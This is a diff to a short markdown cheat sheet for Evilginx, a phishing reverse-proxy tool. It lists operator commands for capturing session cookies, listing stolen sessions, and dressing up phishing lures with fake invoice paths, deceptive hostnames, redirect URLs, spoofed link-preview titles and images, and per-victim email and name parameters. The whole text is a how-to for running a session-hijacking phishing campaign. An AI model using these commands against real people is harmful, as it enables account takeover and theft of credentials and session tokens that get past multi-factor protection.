@@ -1,4 +1,4 @@
-# evilginx
+# Evilginx
 0.To capure session Cookies : 
 		` set cookies always --> keys: ['user_session:always']`
 
@@ -34,3 +34,25 @@
 
 9.Get Cookies/Sessions
 		` sessions Id`
+
+
+*********************************************************************************\
+## Personalizing Lures
+1.Edit Lures
+	`lures edit 0(id) path /download/invoice/12342345`
+
+2.Edit hostname
+ 	`lures edit 0 hostname thisismyrealwebsite.fake.com`
+
+## Redirect URl
+1.Redirect url
+	`lures edit 0 redirect_url https://abcd.com/`
+
+ 
+ 
+ 2.Set Title name  and Images 
+	- We can change `og_title ,og_desc,og_image,og_url`
+   		`lures edit 0 og_title abccwrfgg_title`
+
+3.Custom Parameter
+	`lures get-url 0 email=abc@robin.com name=robin`
